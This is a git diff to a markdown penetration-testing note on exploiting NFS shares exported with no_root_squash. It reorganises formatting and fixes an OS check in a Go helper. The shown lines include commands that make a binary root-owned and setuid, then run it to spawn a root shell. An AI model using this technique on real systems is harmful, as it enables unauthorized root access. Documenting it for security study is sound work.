@@ -69,7 +69,6 @@ If **`no_root_squash`** is used, remote **Root** Users are able to change any fi
 
 <br/>
 
-- `LOCAL`
 
 ```batch
 :: Build 
@@ -86,12 +85,14 @@ sudo chown root:root setuid
 sudo chmod +s setuid
 ```
 
-- `TARGET`
 
 ```batch
 :: Executing the Binary is going to Spawn a Shell with Root Permissions
 ./setuid
 ```
+
+<details><summary>SOURCE</summary>
+<p>
 
 ```go
 package main
@@ -114,7 +115,7 @@ func execute() {
 }
 
 func main() {
-	if runtime.GOOS == "Windows" {
+	if runtime.GOOS == "windows" {
 		fmt.Println("Can't Execute this on a Windows Machine.")
 	} else {
 		fmt.Println("Detected Linux Machine Executing.")
@@ -122,3 +123,6 @@ func main() {
 	}
 }
 ```
+
+</p>
+</details>
